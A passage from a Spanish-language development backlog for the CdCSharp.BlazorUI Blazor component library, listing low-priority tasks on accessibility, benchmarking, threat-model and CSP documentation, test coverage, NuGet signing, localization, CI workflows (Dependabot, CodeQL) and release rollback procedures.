- **Alcance**: `CLAUDE.md` sección *Testing*; `docs/CdCSharp.BlazorUI.Docs.Wasm/Pages/Concepts/Accessibility.razor` (ya existe, expandir).
- **Evidencia**: `docs/.../Accessibility.razor` existe como stub. No hay matriz *componente × criterio WCAG* para orientar nuevos contributors al añadir componentes.
- **Criterios de aceptación**:
  1. Crear tabla de cobertura: filas = componente interactivo, columnas = criterio WCAG relevante (1.4.3 contraste, 2.1.1 keyboard, 2.4.3 focus order, 2.4.7 focus visible, 4.1.2 name/role/value, 4.1.3 status messages).
  2. Marcar estado: Verified / In progress / Not applicable.
  3. Enlazar a los tests `*AccessibilityTests.cs` correspondientes.
  4. Referencia cruzada en `CLAUDE.md` → `CLAUDE-xx`.
- **Notas**: alimenta §3.23 meta-review.

### `PERF-09` — Baseline + BenchmarkDotNet sobre `BUIComponentAttributesBuilder.BuildStyles` y `PatchVolatileAttributes`

- **Severidad**: Polish
- **Esfuerzo**: M
- **Alcance**: nuevo proyecto `test/CdCSharp.BlazorUI.Benchmarks/` (a crear); targets `BuildStyles`, `PatchVolatileAttributes`, `BUIInputText` render.
- **Evidencia**: `PERF-01..08` proponen optimizaciones sin números concretos. Sin BenchmarkDotNet no hay forma de medir si ayudan y cuánto.
- **Criterios de aceptación**:
  1. Crear proyecto benchmark con `BenchmarkDotNet` referenciando `CdCSharp.BlazorUI.Core`.
  2. Benchmarks: (a) `BuildStyles` para componente con 5 features activos; (b) `BuildStyles` para componente sin features (baseline); (c) `PatchVolatileAttributes` × 1000 iteraciones; (d) `BUIInputText` render loop (simulando keystroke) usando bUnit como harness.
  3. Capturar resultado base (pre-`PERF-01`) en `done_TASKS.md` o commit-pinned document.
  4. Re-ejecutar tras cada task `PERF-0x` para verificar que mejora (o descartar la task si no hay beneficio medible).
- **Notas**: requisito previo para aceptar las Major. `PERF-01..03` sin número medido pueden pasar por optimizaciones prematuras.

### `PERF-10` — Documentar contrato de render lifecycle en `CLAUDE.md`: qué corre en cada fase

- **Severidad**: Polish
- **Esfuerzo**: XS
- **Alcance**: `CLAUDE.md` → nueva subsección *Render lifecycle & performance*.
- **Evidencia**: los contribuyentes que añadan componentes deben saber que (a) `BuildStyles` corre en `OnParametersSet` (no en `OnAfterRender`), (b) `PatchVolatileAttributes` corre **cada** `BuildRenderTree`, (c) `BuildComponentDataAttributes` se invoca desde ambos caminos, (d) `BuildComponentCssVariables` sólo desde `BuildStyles`. Sin guía documentada, el riesgo de introducir lógica costosa en el path equivocado es alto.
- **Criterios de aceptación**:
  1. Añadir sección breve (<50 líneas) con diagrama o lista del flujo.
  2. Referencia desde §3.23 meta-review CLAUDE.md.
  3. Enlace cruzado a `PERF-09` baseline.
- **Notas**: edita sólo CLAUDE.md.

### `PERF-11` — Analyzer Roslyn opcional: detectar `RenderFragment` inline en bucles/hot paths

- **Severidad**: Polish
- **Esfuerzo**: L
- **Alcance**: `src/CdCSharp.BlazorUI.CodeGeneration/` (añadir analyzer); opcional diagnostic `BUI0xxx`.
- **Evidencia**: consumidores pueden crear sin saberlo patrones como `@foreach (var item in items) { <BUIButton OnClick="() => Handle(item)" /> }` — genera closure nueva por render × por item. No hay forma automática de alertar.
- **Criterios de aceptación**:
  1. Diagnostic `BUI1001` "Inline closure inside RenderFragment iteration detected" con severidad `Info` por defecto.
  2. Analyzer codefix que sugiera factorizar en método privado o `@key`.
  3. Enlace a documentación explicativa (similar a analyzer CA1848 para logging).
- **Notas**: nice-to-have, puede dejarse para F3. Dependencia conceptual: `GEN-11` (`AnalyzerReleases.*.md`).

### `SEC-10` — Documentar threat model en `docs/` / `CLAUDE.md`: superficie de ataque, supuestos, fronteras de confianza

- **Severidad**: Polish
- **Esfuerzo**: M
- **Alcance**: nuevo archivo `docs/threat-model.md` o sección dedicada en `CLAUDE.md`.
- **Evidencia**: no existe documento de modelo de amenazas. Analíticamente la librería opera en varios contextos (Server vs. Wasm, prerender, hydration, JS interop, localStorage, `MarkupString`, sanitizer) y el modelo está implícito en CLAUDE.md fragmentado.
- **Criterios de aceptación**:
  1. Enumerar actores: consumer dev (confiable), end-user browser (semi-confiable), terceros (CDN de fuentes/iconos, no confiable).
  2. Mapear boundaries: `[Parameter] string` (untrusted si viene de DB/user), `MarkupString` (trusted), `localStorage` (untrusted), `JSObjectReference` (confiable si proviene de nuestros `.ts`).
  3. Listar mitigaciones ya en place y gaps (referenciando `SEC-01..09`).
  4. Documentar supuestos de CSP recomendados para la app consumer.
- **Notas**: dog-food: iterar cuando cerremos `SEC-01..09` para que el doc sea accurate.

### `SEC-11` — Documentar directivas CSP recomendadas para apps consumers (style-src, script-src, connect-src)

- **Severidad**: Polish
- **Esfuerzo**: S
- **Alcance**: sección nueva en `docs/CdCSharp.BlazorUI.Docs.Wasm/Pages/Security.razor` (o equivalente); complementa `SEC-01`.
- **Evidencia**: sin `SEC-01` resuelto, la librería requiere `'unsafe-inline'` en `script-src` por el `<script>` inline de `BUIInitializer`. Los consumers no saben esto hasta que su CSP lo bloquea en runtime.
- **Criterios de aceptación**:
  1. Tabla documentando: fuentes JS (`wwwroot/js/Types/*.min.js` bundles → `script-src 'self'`), fuentes CSS (`wwwroot/css/blazorui.css` → `style-src 'self'`), fuentes de imagen (si las hay), fuentes `connect-src` (si hay SignalR en Server).
  2. Ejemplo de header CSP mínima funcional.
  3. Nota sobre el inline script pre-`SEC-01` con alternativa (nonce o externalización).
- **Notas**: dependencia con `SEC-01` (si se resuelve antes, la tabla simplifica). Dependencia con `DOCS-WASM`.

### `TEST-10` — Cobertura de ramas (branch) como métrica de primer orden: hoy sólo se reporta línea

- **Severidad**: Polish
- **Esfuerzo**: S
- **Alcance**: `Test-Coverage.ps1`; configuración `coverlet`.
- **Evidencia**: el script `Test-Coverage.ps1` genera Cobertura XML (que sí incluye ramas) pero no establece umbral de ramas ni lo publica separadamente. Cobertura de líneas enmascara caminos no explorados (p. ej. `catch` silenciosos — ver `SEC-05`).
- **Criterios de aceptación**:
  1. Reportar LINES y BRANCH separadas en log CI.
  2. Umbral mínimo de BRANCH (p. ej. Core ≥ 75%, BlazorUI ≥ 60%) publicado en `TASKS.md §Baseline` y reforzado en CI.
  3. `ReportGenerator` configurado con `assemblyfilters` para incluir/excluir generators (que suelen distorsionar la métrica).
- **Notas**: depende de `TEST-02` (gate de cobertura base).

### `TEST-11` — Mutation testing opcional (Stryker.NET) sobre `CdCSharp.BlazorUI.Core` para verificar calidad de asserts

- **Severidad**: Polish
- **Esfuerzo**: L
- **Alcance**: nuevo `stryker-config.json` en raíz; pipeline CI opcional.
- **Evidencia**: cobertura ≠ calidad de test. Stryker muta código (cambia `>` por `>=`, elimina `return`) y mide cuántos mutantes sobreviven: mutante que sobrevive = test inefectivo. `BUIComponentAttributesBuilder` y `ComponentFeatures` flags son candidatos ideales (lógica pura + alto volumen de tests).
- **Criterios de aceptación**:
  1. Configurar `stryker-config.json` apuntando a `CdCSharp.BlazorUI.Core` y al test project.
  2. Establecer mutation score baseline (≥ 70% recomendado para Core).
  3. Runner opcional en GitHub Actions (workflow manual `workflow_dispatch`), no bloqueante.
- **Notas**: nice-to-have, no release-gating. Post-1.0.0.

### `DOC-10` — Generar API reference auto (DocFX o MkDocs + doxygen) publicable junto al docs site

- **Severidad**: Polish
- **Esfuerzo**: L
- **Alcance**: `docs/` — opcional sub-proyecto `docs/api/` con DocFX config; pipeline CI para publicar a `gh-pages`.
- **Evidencia**: una vez `GenerateDocumentationFile` activo (post-`DOC-02`), existe la oportunidad de auto-generar API reference navegable. Hoy no hay — el docs site describe componentes con ejemplos pero no lista todos los tipos/miembros públicos programáticamente.
- **Criterios de aceptación**:
  1. `docfx.json` en `docs/api/` consume los `.xml` de `src/*/bin/Release/`.
  2. Publicación a GitHub Pages junto con el docs site (separar paths: `/` para Wasm site, `/api/` para DocFX).
  3. Link cruzado: desde cada página de componente en Wasm → "API reference" en DocFX.
- **Notas**: nice-to-have. Requiere `DOC-02` completo para tener documentación que renderizar.

### `DOC-11` — Playground interactivo en docs (code-copy, live-edit) tipo Storybook/MUI

- **Severidad**: Polish
- **Esfuerzo**: XL
- **Alcance**: `docs/CdCSharp.BlazorUI.Docs.Wasm`.
- **Evidencia**: páginas de componentes hoy muestran ejemplos con `BUICodeBlock` y render estático. Un playground (slider de `Size`, toggle de `Disabled`, editor de `Variant`) drásticamente mejora evaluación por parte de consumers.
- **Criterios de aceptación**:
  1. Para cada componente, panel lateral con controles reactivos (los que mapean a `[Parameter]` públicos).
  2. Generación del snippet C# dinámicamente reflejando los valores actuales.
  3. Botón "copy" (reutilizar `BUIClipboard`).
- **Notas**: F3+ probable. Requiere `DOC-02` (docs XML) para auto-derivar la lista de parámetros controlables.

### `PKG-10` — `EnablePackageValidation=true` con baseline de versión previa: detectar breaking changes entre releases

- **Severidad**: Polish
- **Esfuerzo**: S
- **Alcance**: `Directory.Build.props` post-`ARCH-05`.
- **Evidencia**: el SDK ofrece `<EnablePackageValidation>true</EnablePackageValidation>` + `<PackageValidationBaselineVersion>1.0.0</PackageValidationBaselineVersion>` para que `dotnet pack` compare la API pública con la baseline y falle si hay breaking changes no intencionados. Pairea con `PublicApiAnalyzers` (`API-03`) que es pre-commit; PackageValidation es pre-publish.
- **Criterios de aceptación**:
  1. Post-1.0.0 release, añadir baseline version a todos los csproj publicables.
  2. Step CI que falla si detecta breaking change sin bump a `MAJOR_VERSION`.
- **Notas**: sólo aplica DESPUÉS de tener una 1.0.0 publicada. Pre-1.0.0 es noise (no hay baseline). Ver `REL-xx`.

### `PKG-11` — Firma de paquete NuGet (code-signing cert) + verify step en CI

- **Severidad**: Polish
- **Esfuerzo**: L
- **Alcance**: `.github/workflows/publish.yml`; secrets (`NUGET_SIGN_CERT_PFX`, `NUGET_SIGN_CERT_PASSWORD`).
- **Evidencia**: paquetes sin firmar se marcan con warning en nuget.org `"This package is unsigned"`. Para un paquete 1.0 con aspiración enterprise, firmar incrementa confianza.
- **Criterios de aceptación**:
  1. Obtener certificado code-signing (Azure Trusted Signing o DigiCert para OSS).
  2. Añadir step `dotnet nuget sign **.nupkg --certificate-path ... --timestamper ...`.
  3. Step verify post-sign: `dotnet nuget verify **.nupkg`.
- **Notas**: coste €/año; evaluar si vale la pena para el alcance del proyecto. Azure Trusted Signing es gratis para OSS (pendiente disponibilidad 2026).

### `L10N-10` — No existe contrato `IBlazorUILocalizer` en `Core`: imposible componer un `BUICultureSelector` agnóstico del host

- **Severidad**: Polish
- **Esfuerzo**: M
- **Alcance**: `src/CdCSharp.BlazorUI.Core/` (nuevo `Abstractions/Localization/`); `src/CdCSharp.BlazorUI.Localization.Server/`; `src/CdCSharp.BlazorUI.Localization.Wasm/`.
- **Evidencia**:
  - `CdCSharp.BlazorUI.Localization.Server/Components/BUICultureSelector.razor` y `CdCSharp.BlazorUI.Localization.Wasm/Components/BUICultureSelector.razor` son dos archivos duplicados porque no hay una abstracción en `Core` que describa "qué hace un selector de cultura".
  - `ILocalizationPersistence` está en `Localization.Wasm` (no en `Core`), pero el Server no lo usa — usa cookies vía endpoint redirect.
  - No hay una interfaz común (`ICultureProvider`, `ICultureSetter`) que ambas implementaciones cumplan, lo que bloquea también a terceros que quieran conectar su propio backend (DB, claim-based, tenant-scoped).
- **Criterios de aceptación**:
  1. Definir en `Core/Abstractions/Localization/`:
     - `ICultureProvider` con `CultureInfo GetCurrentCulture()` + `IReadOnlyList<CultureInfo> SupportedCultures`.
     - `ICultureSetter` con `Task SetCultureAsync(string cultureName, CancellationToken ct)` + evento `OnCultureChanged`.
  2. Mover `BUICultureSelector` a `CdCSharp.BlazorUI` principal consumiendo `ICultureProvider` + `ICultureSetter` via DI.
  3. Server implementa `ICultureSetter` vía cookie + redirect; Wasm implementa vía `LocalizationPersistence` + reload (ver `L10N-08` para evolución sin reload).
  4. Docs: ejemplo de tercero implementando `ICultureSetter` con claim de usuario (multi-tenant).
- **Notas**: dependencia fuerte con `L10N-01`. Esta tarea es el "paso 2" tras consolidar: una vez unificado, extraer contratos a Core para permitir extensión.

### `L10N-11` — Falta documentación E2E para setup de localización + ausencia de ejemplos `.resx` en docs site

- **Severidad**: Polish
- **Esfuerzo**: M
- **Alcance**: `docs/CdCSharp.BlazorUI.Docs.Wasm/` (nueva página `Localization/Setup.razor`); `README.md`; proyectos sample (`samples/CdCSharp.BlazorUI.AppTest.Server`, `samples/CdCSharp.BlazorUI.AppTest.Wasm`).
- **Evidencia**:
  - Consumidor no tiene guía paso a paso:
    1. ¿Qué paquete instalar (`.Server` vs `.Wasm`)?
    2. ¿Dónde crear `Resources/MyComponent.es-ES.resx`?
    3. ¿Cómo configurar `<ResourcesPath>Resources</ResourcesPath>` + `<RootNamespace>`?
    4. ¿Cómo añadir `AddBlazorUILocalizationServer()` + `app.UseRequestLocalization()` con cookie provider?
    5. ¿Cómo usar `BUICultureSelector` en el layout?
  - Ejemplos `.resx` no existen en `samples/` ni en docs; sólo los strings hardcoded en los propios componentes Blazor.
- **Criterios de aceptación**:
  1. Añadir página `docs/.../Pages/Localization/Setup.razor` con quickstart Server + Wasm lado a lado (similar al patrón de otras páginas docs).
  2. Crear en `samples/CdCSharp.BlazorUI.AppTest.Server/Resources/Pages/Home.en-US.resx` + `Home.es-ES.resx` como ejemplo funcional; mismo en `AppTest.Wasm`.
  3. Documentar flujo de culture persistence (cookie → HttpContext en Server; `localStorage` → `CultureInfo.DefaultThreadCulture` en Wasm).
  4. Troubleshooting section: "culture no cambia", "resx no se encuentra", "prerender lee cultura default".
- **Notas**: cross con `DOC-xx`. Setup de localización Blazor es notoriamente frágil; ejemplos reales reducen fricción de adopción.

### `CI-10` — Ausencia de `.github/dependabot.yml`: actualizaciones de NuGet + actions + npm son manuales

- **Estado**: ✅ Resuelto (commit `5e9b946`, criterios 1-2) — `.github/dependabot.yml` nuevo declara dos ecosystems con schedule semanal: **nuget** (limit 5 PRs, groups `microsoft-aspnet` ASP.NET/Extensions, `microsoft-codeanalysis`, `test-stack` xunit+bUnit+Verify+FluentAssertions+NSubstitute) y **github-actions** (limit 3, grupo `actions: *`). Labels `dependencies` + `nuget`/`ci` en cada ecosystem para filtrar en backlog. **npm** descartado por diseño: `package-lock.json` es gitignored (BLD-PIPE-14) y Dependabot lo requiere para detectar drift; habilitarlo sin lock trackeado produciría PRs espurios. Criterio 3 (auto-merge reviewers) queda como decisión operacional — el fichero se puede actualizar fácilmente una vez el mantenedor defina política.
- **Severidad**: Polish
- **Esfuerzo**: XS
- **Alcance**: `.github/dependabot.yml` (nuevo).
- **Evidencia**: el repo no tiene `dependabot.yml`; `actions/checkout@v4`, `actions/setup-dotnet@v4`, `actions/create-release@v1` (ver `CI-02`) y paquetes NuGet (`Microsoft.AspNetCore.Components.Web 10.0.6`) dependen de revisión manual para upgrade.
- **Criterios de aceptación**:
  1. Crear `.github/dependabot.yml`:
     ```yaml
     version: 2
     updates:
       - package-ecosystem: "nuget"
         directory: "/"
         schedule: { interval: "weekly" }
         groups:
           microsoft-aspnet:
             patterns: ["Microsoft.AspNetCore.*", "Microsoft.Extensions.*"]
       - package-ecosystem: "github-actions"
         directory: "/"
         schedule: { interval: "weekly" }
       - package-ecosystem: "npm"
         directory: "/src/CdCSharp.BlazorUI"
         schedule: { interval: "weekly" }
     ```
  2. Grupos evitan ruido de 10 PRs sueltos; un único PR por ecosystem/semana.
  3. Configurar labels (`dependencies`, `auto-merge` si hay confianza) y reviewers.
- **Notas**: Dependabot es gratis en repos públicos; si privado, incluido en GitHub Advanced Security para organizaciones.

### `CI-11` — Falta workflow CodeQL + secret-scanning no habilitado: cero gating estático de seguridad en PRs

- **Estado**: ✅ Resuelto (commit `5e9b946`, criterio 1) — `.github/workflows/codeql.yml` nuevo ejecuta CodeQL con matrix `csharp` + `javascript-typescript` en push a `main`/`develop`, en PRs a esas ramas y schedule semanal (lunes 06:00 UTC). Configuración mínima segura: `queries: security-extended` (amplía sobre `security-and-quality` por defecto), `permissions` scoped al mínimo (`actions: read, contents: read, security-events: write`), `concurrency` cancel-in-progress para no-tags, y pin de SDK vía `global.json` (alineado con CI-07). `setup-dotnet` sólo en matrix csharp. Secret-scanning (criterio 2) es settings de repo no config-as-code — decisión del mantenedor al activar "Secret scanning" + "Push protection" en Settings → Security. `codeql.yml` cubre el gate estático que CI-11 pide; la activación server-side de secret scanning queda documentada como follow-up operacional en el propio CI-11.
- **Severidad**: Polish
- **Esfuerzo**: S
- **Alcance**: `.github/workflows/codeql.yml` (nuevo); settings del repo (secret scanning, push protection).
- **Evidencia**: no hay workflow de CodeQL y `publish.yml` no ejecuta ninguna herramienta de SAST. Para un paquete NuGet público, un PR hostil podría introducir código vulnerable sin señal automática.
- **Criterios de aceptación**:
  1. Añadir `.github/workflows/codeql.yml` con plantilla oficial:
     ```yaml
     name: "CodeQL"
     on:
       push: { branches: [main, develop] }
       pull_request: { branches: [main, develop] }
       schedule: [{ cron: '0 6 * * 1' }]
     jobs:
       analyze:
         runs-on: ubuntu-latest
         permissions: { actions: read, contents: read, security-events: write }
         strategy: { matrix: { language: [csharp, javascript] } }
         steps:
           - uses: actions/checkout@v4
           - uses: github/codeql-action/init@v3
             with: { languages: ${{ matrix.language }} }
           - uses: github/codeql-action/autobuild@v3
           - uses: github/codeql-action/analyze@v3
     ```
  2. Analizar `csharp` (código de la librería) y `javascript` (los `.ts` bundle).
  3. Habilitar en Settings → Code security: Secret scanning + Push protection.
  4. Revisar alerts semanalmente (integrar en rotación de mantenimiento).
- **Notas**: gratis para repos públicos. Para la org, habilitar en "Settings → Code security and analysis → Default setup" como alternativa al workflow manual. Complementa `SEC-xx` (findings dinámicos + RevDeps).

### `DOCS-WASM-10` — Sin telemetría / analytics definida: cero señal de qué componentes consultan usuarios ni qué búsquedas fallan

- **Severidad**: Polish
- **Esfuerzo**: S
- **Alcance**: `docs/CdCSharp.BlazorUI.Docs.Wasm/wwwroot/index.html`; política de privacidad (nueva).
- **Evidencia**: sin analytics, el mantenimiento de docs es ciego. Ni `Google Analytics 4`, ni `Plausible`, ni siquiera `Cloudflare Web Analytics` (privacy-friendly, sin cookies). La priorización de qué páginas completar/traducir (ver `DOCS-WASM-01`) no está informada por datos.
- **Criterios de aceptación**:
  1. **[Decisión F1 D-20]** Opción (a): **cero telemetría**. No se integra GA4, Plausible, Fathom ni Cloudflare Web Analytics.
  2. Añadir `docs/CdCSharp.BlazorUI.Docs.Wasm/privacy.md` (o sección en `README`) declarando explícitamente: "Este sitio no recopila analytics, no usa cookies, no carga scripts de terceros".
  3. Retirar cualquier referencia a "analytics" de `CLAUDE.md` y templates de issue/PR.
  4. Revisar `index.html` y confirmar que no hay `<script src="...analytics...">` ni `gtag`/`plausible`/`fathom` inline.
- **Notas**: Plausible £9/mes, Cloudflare gratis. Para docs OSS, "cero telemetría" es válido — pero entonces retirar referencias a analytics del CLAUDE.md. Decisión D-20 (ver §Directivas de diseño): privacy-first por defecto confirmada.

### `DOCS-WASM-11` — `manifest.webmanifest` sin icono 512×512 + sin `screenshots`: puntaje PWA install prompt reducido

- **Severidad**: Polish
- **Esfuerzo**: XS
- **Alcance**: `docs/CdCSharp.BlazorUI.Docs.Wasm/wwwroot/manifest.webmanifest`; `wwwroot/icon-512.png`, `wwwroot/screenshot-*.png` (nuevos).
- **Evidencia**:
  ```json
  "icons": [
    { "src": "icon.svg", ... },
    { "src": "icon-192.png", "sizes": "192x192", ... },
    { "src": "icon-192.png", "sizes": "192x192", "purpose": "maskable" }
  ]
  // no icon-512, no screenshots, no shortcuts
  ```
  - Lighthouse PWA audit marca `icon-512` como requerido para instalabilidad en Android y Windows.
  - Sin `screenshots` → el install prompt en Chrome Android muestra sólo ícono + nombre, sin preview.
  - `BlazorUI` aspira a ser referenciable como PWA de calidad; el manifest incompleto baja percepción.
- **Criterios de aceptación**:
  1. Generar `icon-512.png` (purpose `any`) y `icon-512-maskable.png`.
  2. Añadir entradas correspondientes al manifest.
  3. Añadir `screenshots` (dos imágenes 1280x720, una narrow 720x1280) mostrando Home + un ComponentPage.
  4. Añadir `"shortcuts": [...]` para navegación rápida a "Components" y "GettingStarted".
  5. Validar con Lighthouse → sección PWA ≥ 95.
- **Notas**: cross con `DOCS-WASM-06` (SW real). Juntos, elevan el docs site a PWA completa.

### `CLAUDE-10` — Sin `CLAUDE.md` cascading en subdirectorios (`src/Core/`, `docs/`, `test/`): agentes con context window parcial pierden guidance local

- **Severidad**: Polish
- **Esfuerzo**: S
- **Alcance**: `src/CdCSharp.BlazorUI.Core/CLAUDE.md`, `test/CdCSharp.BlazorUI.Tests.Integration/CLAUDE.md`, `docs/CLAUDE.md` (nuevos, opcionales).
- **Evidencia**: Claude Code lee CLAUDE.md del cwd + ancestors. Si un agente opera con cwd `test/CdCSharp.BlazorUI.Tests.Integration/Tests/Components/Button/`, carga el root `CLAUDE.md`. OK. Pero puede perder context local a nivel subcarpeta si en el futuro la subarquitectura divirge.
  - Ejemplo: patrones de test específicos (bUnit idiosyncracies, `FakeNavigationManager` setup) podrían documentarse en `test/.../CLAUDE.md`.
  - Ejemplo: patrones de generators podrían documentarse en `src/CdCSharp.BlazorUI.BuildTools/CLAUDE.md`.
- **Criterios de aceptación**:
  1. Para ahora, evaluar si la guidance es lo suficientemente divergente para justificar un doc local. Caso base: no hacerlo.
  2. Si se hace, documentar sólo el delta sobre root CLAUDE.md (no duplicar).
  3. Añadir a `CLAUDE.md` meta-doc: "CLAUDE.md cascading supported; add subdir-level docs only when patterns diverge significantly from root."
- **Notas**: útil para monorepos grandes. Proyecto actual podría no necesitarlo aún — polish, no prioridad.

### `CLAUDE-11` — `CLAUDE.md` 282 líneas sin TOC: navegación lenta para humanos y LLMs con search limitado

- **Severidad**: Polish
- **Esfuerzo**: XS
- **Alcance**: `CLAUDE.md` (añadir TOC tras línea 3).
- **Evidencia**: 282 líneas organizadas en 8 secciones `##`. Buscar "async conventions" requiere scroll o grep. Un LLM que recibe CLAUDE.md como context lee todo, pero un humano edita por sección — TOC acelera.
- **Criterios de aceptación**:
  1. Añadir justo tras el intro:
     ```markdown
     ## Table of Contents
     - [Overview](#overview)
     - [Common commands](#common-commands)
     - [Build pipeline](#build-pipeline-non-standard--read-before-touching-the-build)
     - [Project layout](#project-layout)
     - [Component architecture](#component-architecture)
     - [DOM/CSS generation via IHas* interfaces](#domcss-generation-via-ihas-interfaces)
     - [CSS architecture](#css-architecture)
     - [Async / JS interop conventions](#async--js-interop-conventions)
     - [Testing](#testing)
     - [Release / versioning](#release--versioning)
     ```
  2. Mantener actualizado si se añaden secciones (CLAUDE-04 §Exceptions, CLAUDE-07 §Localization, CLAUDE-09 §Contributing).
- **Notas**: TOC es barato de mantener; markdown renderers modernos lo auto-linkean. Mejora significativa en doc UX sin coste.

### `REL-10` — Sin métricas post-release definidas: ausencia de criterios para declarar un release "exitoso"

- **Severidad**: Polish
- **Esfuerzo**: M
- **Alcance**: documentación (nueva `docs/release-metrics.md` o sección en CLAUDE.md).
- **Evidencia**: tras publicar `1.0.0`, no hay criterios para medir éxito vs. regresión:
  - ¿Cuántos downloads en 30d es ruta "healthy"?
  - ¿Cuántos issues abiertos en 7d post-release es rango "recibido bien"?
  - ¿Qué rate de nuevos installs en preview vs stable?
  - Sin definición → equipo no sabe cuándo escalar, cuándo publicar `1.0.1`, cuándo considerar yank.
- **Criterios de aceptación**:
  1. Definir KPIs mínimos:
     - Downloads acumulados 30d ≥ X (según ambición del proyecto).
     - Issues críticos abiertos 7d = 0 (condición para declarar release stable).
     - % adoption preview vs stable = señal de confianza.
  2. Dashboard mensual en `docs/` con snapshot de nuget.org stats, GitHub insights.
  3. Proceso: si KPI crítico se incumple → hotfix en 48h o rollback (ver `REL-11`).
- **Notas**: madurez organizacional. Proyectos OSS small-scale pueden skipear; enterprise requiere.

### `REL-11` — Sin playbook de rollback / yank: si `1.0.0` tiene regresión crítica, el proceso es manual y no documentado

- **Severidad**: Polish
- **Esfuerzo**: S
- **Alcance**: documentación (nueva `docs/release-rollback.md` o sección en `CONTRIBUTING.md`).
- **Evidencia**: escenario: `1.0.0` se publica; una hora después se detecta un regresión crítica (p. ej. `BUIButton.OnClick` no dispara). Opciones:
  - `dotnet nuget delete` (unlist, no delete real) — consumers con lock file no afectados hasta restore.
  - Publicar `1.0.1` con fix inmediato.
  - Comunicar a consumers por GitHub issue.
  - Sin playbook, el equipo improvisa → latencia elevada de respuesta.
- **Criterios de aceptación**:
  1. Documentar decisión tree:
     - Si bug afecta instalación → unlist + 1.0.1 inmediato.
     - Si bug afecta runtime pero workaround existe → 1.0.1 en 72h + issue pinned.
     - Si bug afecta seguridad → ver `SECURITY.md` + coordinated disclosure.
  2. Template de GitHub issue "Regression in <version>" con mandatory fields.
  3. Test post-unlist: instalar el paquete desde cero en una app nueva + smoke test.
  4. Post-mortem obligatorio tras rollback (template en `docs/`).
- **Notas**: cross con `SECURITY.md` (`REL-06`). Raro pero caro cuando ocurre; el playbook reduce tiempo de respuesta a horas.

---

## Plantilla de tarea

```markdown
### `<ID>` — <Título accionable>

- **Severidad**: Blocker | Critical | Major | Minor | Polish
- **Esfuerzo**: XS | S | M | L | XL
- **Alcance**: `<ruta/a/archivo.cs>` y/o patrón afectado
- **Evidencia**: `<ruta:línea>` o comando reproducible
- **Criterios de aceptación**:
  1. ...
  2. ...
- **Notas**: contexto adicional, links, decisiones tomadas
```
